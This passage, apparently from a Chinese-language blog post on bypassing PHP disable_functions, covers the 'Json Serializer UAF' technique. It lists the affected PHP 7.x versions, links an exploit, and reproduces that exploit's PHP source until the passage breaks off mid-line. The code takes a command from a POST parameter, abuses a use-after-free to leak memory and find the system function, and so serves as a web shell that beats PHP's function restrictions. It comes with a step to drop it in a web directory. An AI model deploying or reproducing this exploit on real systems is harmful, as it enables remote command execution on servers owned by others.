class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接在web目录创建个php文件把代码复制进去，然后访问即可<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703468.png" alt="image-20231206170304377"></p><h2 id="利用-Json-Serializer-UAF"><a href="#利用-Json-Serializer-UAF" class="headerlink" title="利用 Json Serializer UAF"></a>利用 Json Serializer UAF</h2><p>利用json序列化中的堆溢出触发，借以绕过disable_function</p><h3 id="利用条件-9"><a href="#利用条件-9" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Linux 操作系统</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 &lt; 7.2.19 (released: 30 May 2019)</li><li>PHP7.3 &lt; 7.3.6 (released: 30 May 2019)</li></ul><h3 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h3><p><a href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php">exp</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$cmd = &quot;id&quot;;</span></span><br><span class="line">  <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[cmd];</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">8</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">get_class</span>(<span class="variable">$spl1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x18</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$spl1</span>::<span class="variable">$leak</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$y</span>, <span class="variable">$cmd</span>, <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>, <span class="variable">$n_alloc</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$contiguous</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$contiguous</span>[] = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$room</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$room</span>[] = <span class="keyword">new</span> <span class="title function_ invoke__">Z</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_protector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$y</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$protector</span> = <span class="string">&quot;.<span class="subst">$_protector</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line">        <span class="variable">$x</span>-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        <span class="variable">$x</span>-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;UAF failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line">        <span class="variable">$spl2</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        <span class="variable">$class_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        <span class="variable">$handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        <span class="variable">$php_heap</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        <span class="variable">$fake_obj</span> = <span class="variable">$abc_addr</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>, <span class="variable">$abc_addr</span>); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak1</span>(<span class="variable">$class_entry</span> + <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        <span class="variable">$fake_tbl_off</span> = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x30</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x38</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$handlers</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="variable 